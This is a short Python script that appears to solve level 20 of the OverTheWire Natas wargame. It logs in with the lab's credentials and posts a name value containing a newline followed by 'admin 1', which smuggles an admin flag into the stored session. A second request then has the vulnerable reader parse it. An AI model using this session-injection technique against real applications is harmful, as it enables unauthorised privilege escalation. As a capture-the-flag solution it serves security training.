#!/usr/bin/env python3
import requests

s = requests.Session()
s.auth = ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
url = 'http://natas20.natas.labs.overthewire.org/index.php'
r1 = s.post(url, data={'name': 'qsdf\nadmin 1'})
# Make a second request so the session is read again with the vulnerable function "myread".
r = s.get(url)
print(r.text)
